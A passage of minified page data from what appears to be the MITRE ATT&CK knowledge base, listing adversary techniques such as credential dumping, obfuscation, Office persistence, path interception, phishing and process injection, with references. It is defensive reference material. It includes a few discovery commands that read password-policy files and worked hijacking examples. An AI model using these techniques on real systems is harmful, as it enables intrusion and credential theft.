2018."},{url:f,description:g,source_name:h}],tactics:[o]},{id:P,"object-type":a,name:"OS Credential Dumping",description:"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0008'\u003ELateral Movement\u003C\u002Fa\u003E and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",external_references:[{source_name:b,external_id:P,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003"},{description:dj,url:dk,source_name:dl},{url:bN,description:bO,source_name:bP},{url:yh,description:yi,source_name:yj},{url:yk,description:yl,source_name:ym},{url:yn,description:yo,source_name:yp},{url:fZ,description:yq,source_name:yr},{url:ys,description:yt,source_name:yu},{url:yv,description:yw,source_name:yx},{url:f_,description:yy,source_name:yz}],tactics:[r],subtechniques:[yA,yC,yE,yG,yI,yK,yM,yO]},{id:aC,"object-type":a,name:"Obfuscated Files or Information",description:"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1140'\u003EDeobfuscate\u002FDecode Files or Information\u003C\u002Fa\u003E for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E. The user may also be required to input a password to open a password protected compressed\u002Fencrypted file that was provided by the adversary. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2016\u002F11\u002F09\u002Fpowerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2013\u002F04\u002F26\u002Flinuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F09\u002F23\u002Fsecurity-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also obfuscate commands executed from payloads or directly via a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E. Environment variables, aliases, characters, and other platform\u002Flanguage specific semantics can be used to evade signature based detections and application control mechanisms. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F06\u002Fobfuscation-in-the-wild.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fblog\u002Fpdfs\u002Frevoke-obfuscation-report.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F03\u002Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ",external_references:[{source_name:b,external_id:aC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027"},{external_id:"CAPEC-267",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F267.html"},{url:ps,description:pt,source_name:pu},{url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2013\u002F04\u002F26\u002Flinuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole\u002F",description:"Pierre-Marc Bureau. (2013, April 26). Linux\u002FCdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",source_name:"Linux\u002FCdorked.A We Live Security Analysis"},{url:pp,description:pq,source_name:pr},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F06\u002Fobfuscation-in-the-wild.html",description:"Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",source_name:"FireEye Obfuscation June 2017"},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fblog\u002Fpdfs\u002Frevoke-obfuscation-report.pdf",description:"Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",source_name:"FireEye Revoke-Obfuscation July 2017"},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F03\u002Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks\u002F",description:"White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",source_name:"PaloAlto EncodedCommand March 2017"},{url:"https:\u002F\u002Fgithub.com\u002Fdanielbohannon\u002FRevoke-Obfuscation",description:"Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",source_name:"GitHub Revoke-Obfuscation"},{url:"https:\u002F\u002Fgithub.com\u002Fitsreallynick\u002Foffice-crackros",description:"Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",source_name:"GitHub Office-Crackros Aug 2016"}],tactics:[d],subtechniques:[yQ,yS,yU,yW,yY]},{id:ab,"object-type":a,name:"Obtain Capabilities",description:"Adversaries may buy and\u002For steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.nytimes.com\u002F2013\u002F07\u002F14\u002Fworld\u002Feurope\u002Fnations-buying-as-hackers-sell-computer-flaws.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcitizenlab.ca\u002F2016\u002F08\u002Fmillion-dollar-dissident-iphone-zero-day-nso-group-uae\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL\u002FTLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Ffinal-report-diginotar-hack-shows-total-compromise-ca-servers-103112\u002F77170\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:ab,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588"},{source_name:y_,description:y$,url:za},{url:zb,description:zc,source_name:zd},{description:ze,source_name:zf,url:zg}],tactics:[e],subtechniques:[zh,zj,zl,zn,zp,zq]},{id:ac,"object-type":a,name:"Office Application Startup",description:"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fsensepost\u002Fruler'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These persistence mechanisms can work within Outlook or be used through Office 365.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Foffice365security\u002Fdefending-against-rules-and-forms-injection\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:ac,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137"},{source_name:"SensePost Ruler GitHub",url:"https:\u002F\u002Fgithub.com\u002Fsensepost\u002Fruler",description:"SensePost. (2016, August 18). Ruler: A tool to abuse Exchange services. Retrieved February 4, 2019."},{source_name:"TechNet O365 Outlook Rules",url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Foffice365security\u002Fdefending-against-rules-and-forms-injection\u002F",description:"Koeller, B.. (2018, February 21). Defending Against Rules and Forms Injection. Retrieved November 5, 2019."},{source_name:zs,url:zt,description:zu},{source_name:zv,url:zw,description:zx},{source_name:dm,url:dn,description:do0},{source_name:dp,url:dq,description:dr}],tactics:[k],subtechniques:[zy,zD,zF,zH,zJ,zL]},{id:zN,"object-type":a,name:"Password Policy Discovery",description:"Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E. This would help the adversary to create a list of common passwords and launch dictionary and\u002For brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as \u003Ccode\u003Enet accounts (\u002Fdomain)\u003C\u002Fcode\u003E, \u003Ccode\u003EGet-ADDefaultDomainPasswordPolicy\u003C\u002Fcode\u003E, \u003Ccode\u003Echage -l \u003Cusername\u003E\u003C\u002Fcode\u003E, \u003Ccode\u003Ecat \u002Fetc\u002Fpam.d\u002Fcommon-password\u003C\u002Fcode\u003E, and \u003Ccode\u003Epwpolicy getaccountpolicies\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsuperuser.com\u002Fquestions\u002F150675\u002Fhow-to-display-password-policy-information-for-a-user-ubuntu'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.jamf.com\u002Fjamf-nation\u002Fdiscussions\u002F18574\u002Fuser-password-policies-on-non-ad-machines'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:zN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1201"},{url:"https:\u002F\u002Fsuperuser.com\u002Fquestions\u002F150675\u002Fhow-to-display-password-policy-information-for-a-user-ubuntu",description:"Matutiae, M. (2014, August 6). How to display password policy information for a user (Ubuntu)?. Retrieved April 5, 2018.",source_name:"Superuser Linux Password Policies"},{url:"https:\u002F\u002Fwww.jamf.com\u002Fjamf-nation\u002Fdiscussions\u002F18574\u002Fuser-password-policies-on-non-ad-machines",description:"Holland, J. (2016, January 25). User password policies on non AD machines. Retrieved April 5, 2018.",source_name:"Jamf User Password Policies"}],tactics:[i]},{id:zO,"object-type":a,name:"Path Interception",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F007'\u003EPath Interception by PATH Environment Variable\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F008'\u003EPath Interception by Search Order Hijacking\u003C\u002Fa\u003E, and\u002For \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F009'\u003EPath Interception by Unquoted Path\u003C\u002Fa\u003E.**\n\nPath interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Fsrd\u002F2014\u002F04\u002F08\u002Fms14-019-fixing-a-binary-hijacking-via-cmd-or-bat-file\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys) \u003Csup\u003E\u003Ca href='http:\u002F\u002Fsupport.microsoft.com\u002FKB\u002F103000'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., \u003Ccode\u003EC:\\unsafe path with space\\program.exe\u003C\u002Fcode\u003E vs. \u003Ccode\u003E\"C:\\safe path with space\\program.exe\"\u003C\u002Fcode\u003E). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FHelp+eliminate+unquoted+path+vulnerabilities\u002F14464'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is \u003Ccode\u003EC:\\program files\\myapp.exe\u003C\u002Fcode\u003E, an adversary may create a program at \u003Ccode\u003EC:\\program.exe\u003C\u002Fcode\u003E that will be run instead of the intended program. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurityboulevard.com\u002F2018\u002F04\u002Fwindows-privilege-escalation-unquoted-services\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sploitspren.com\u002F2018-01-26-Windows-Privilege-Escalation-Guide\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, \u003Ccode\u003E%SystemRoot%\\system32\u003C\u002Fcode\u003E (e.g., \u003Ccode\u003EC:\\Windows\\system32\u003C\u002Fcode\u003E), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if \u003Ccode\u003EC:\\example path\u003C\u002Fcode\u003E precedes \u003Ccode\u003EC:\\Windows\\system32\u003C\u002Fcode\u003E is in the PATH environment variable, a program that is named net.exe and placed in \u003Ccode\u003EC:\\example path\u003C\u002Fcode\u003E will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms682425'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc723564.aspx#XSLTsection127121120120'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms687393'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument \u003Ccode\u003Enet user\u003C\u002Fcode\u003E. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then \u003Ccode\u003Ecmd.exe \u002FC net user\u003C\u002Fcode\u003E will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Ffd7hxfdd.aspx'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1038'\u003EDLL Search Order Hijacking\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:zO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1034"},{external_id:vx,source_name:c,url:vy},{url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Fsrd\u002F2014\u002F04\u002F08\u002Fms14-019-fixing-a-binary-hijacking-via-cmd-or-bat-file\u002F",description:"Nagaraju, S. (2014, April 8). MS14-019 – Fixing a binary hijacking via .cmd or .bat file. Retrieved July 25, 2016.",source_name:"TechNet MS14-019"},{url:"http:\u002F\u002Fsupport.microsoft.com\u002FKB\u002F103000",description:"Microsoft. (n.d.). CurrentControlSet\\Services Subkey Entries. Retrieved November 30, 2014.",source_name:"Microsoft Subkey"},{url:vE,description:"Baggett, M. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved December 4, 2014.",source_name:"Baggett 2012"},{url:vF,description:vG,source_name:"SecurityBoulevard Unquoted Services APR 2018"},{url:"https:\u002F\u002Fwww.sploitspren.com\u002F2018-01-26-Windows-Privilege-Escalation-Guide\u002F",description:"McFarland, R. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.",source_name:"SploitSpren Windows Priv Jan 2018"},{url:fK,description:fL,source_name:fM},{url:"http:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc723564.aspx#XSLTsection127121120120",description:"Hill, T. (n.d.). Windows NT Command Shell. Retrieved December 5, 2014.",source_name:"Hill NT Shell"},{url:vz,description:vA,source_name:vB},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Ffd7hxfdd.aspx",description:"Microsoft. (n.d.). Environment Property. Retrieved July 27, 2016.",source_name:"MSDN Environment Property"}],tactics:[k,u]},{id:zP,"object-type":a,name:"Peripheral Device Discovery",description:"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1120",external_id:zP},{external_id:"CAPEC-646",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F646.html"}],tactics:[i]},{id:bQ,"object-type":a,name:"Permission Groups Discovery",description:"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",external_references:[{source_name:b,external_id:bQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1069"},{external_id:"CAPEC-576",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F576.html"}],tactics:[i],subtechniques:[zQ,zS,zU]},{id:bR,"object-type":a,name:"Phishing",description:"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.",external_references:[{source_name:b,external_id:bR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566"},{external_id:"CAPEC-98",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F98.html"},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd}],tactics:[q],subtechniques:[zW,zZ,Ad]},{id:bS,"object-type":a,name:"Phishing for Information",description:"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Ffacebook-launching-pad-phishing-attacks\u002F160351\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Fi\u002Ftricky-forms-of-phishing.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.pcmag.com\u002Fnews\u002Fhackers-try-to-phish-united-nations-staffers-with-fake-login-pages'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnakedsecurity.sophos.com\u002F2020\u002F10\u002F02\u002Fserious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fryhanson\u002Fphishery'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E) and\u002For sending multiple, seemingly urgent messages.",external_references:[{source_name:b,external_id:bS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598"},{source_name:Af,url:Ag,description:Ah},{source_name:Ai,url:Aj,description:Ak},{source_name:Al,url:Am,description:An},{source_name:Ao,url:Ap,description:Aq},{source_name:Ar,url:gc,description:As},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd}],tactics:[l],subtechniques:[At,Av,Ax]},{id:aD,"object-type":a,name:"Pre-OS Boot",description:"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBooting'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input\u002FOutput System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",external_references:[{source_name:b,external_id:aD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542"},{source_name:"Wikipedia Booting",url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBooting",description:"Wikipedia. (n.d.). Booting. Retrieved November 13, 2019."},{url:Az,description:AA,source_name:AB}],tactics:[d,k],subtechniques:[AC,AE,AG,AI,AK]},{id:AM,"object-type":a,name:"Process Discovery",description:"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software\u002Fapplications running on systems within the network. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1057'\u003EProcess Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0057'\u003ETasklist\u003C\u002Fa\u003E utility via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E or \u003Ccode\u003EGet-Process\u003C\u002Fcode\u003E via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E. Information about processes can also be extracted from the output of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003E calls such as \u003Ccode\u003ECreateToolhelp32Snapshot\u003C\u002Fcode\u003E. In Mac and Linux, this is accomplished with the \u003Ccode\u003Eps\u003C\u002Fcode\u003E command. Adversaries may also opt to enumerate processes via \u002Fproc.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1057",external_id:AM},{external_id:"CAPEC-573",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F573.html"}],tactics:[i]},{id:G,"object-type":a,name:"Process Injection",description:"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",external_references:[{source_name:b,external_id:G,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055"},{external_id:vk,source_name:c,url:vl},{url:C,description:D,source_name:E},{description:gd,source_name:ge},{url:gf,description:gg,source_name:gh},{url:gi,description:gj,source_name:gk},{url:gl,description:gm,source_name:gn},{url:cE,description:cF,source_name:cG}],tactics:[d,u],subtechniques:[AN,AP,AR,AT,AV,AX,AZ,A$,Bb,Bd,Bf]},{id:Bh,"object-type":a,name:"Protocol Tunneling",description:"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection\u002Fnetwork filtering and\u002For enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and\u002For provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ssh.com\u002Fssh\u002Ftunneling'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1572'\u003EProtocol Tunneling\u003C\u002Fa\u003E may also be abused by adversaries during \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1568'\u003EDynamic Resolution\u003C\u002Fa\u003E. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fnew-godlua-malware-evades-traffic-monitoring-via-dns-over-https\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAdversaries may also leverage \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1572'\u003EProtocol Tunneling\u003C\u002Fa\u003E in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090'\u003EProxy\u003C\u002Fa\u003E and\u002For \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1001\u002F003'\u003EProtocol Impersonation\u003C\u002Fa\u003E to further conceal C2 communications and infrastructure. ",external_references:[{source_name:b,external_id:Bh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1572"},{source_name:"SSH Tunneling",url:"https:\u002F\u002Fwww.ssh.com\u002Fssh\u002Ftunneling",description:"SSH.COM. (n.d.). SSH tunnel. Retrieved March 15, 2020."},{source_name:"BleepingComp Godlua 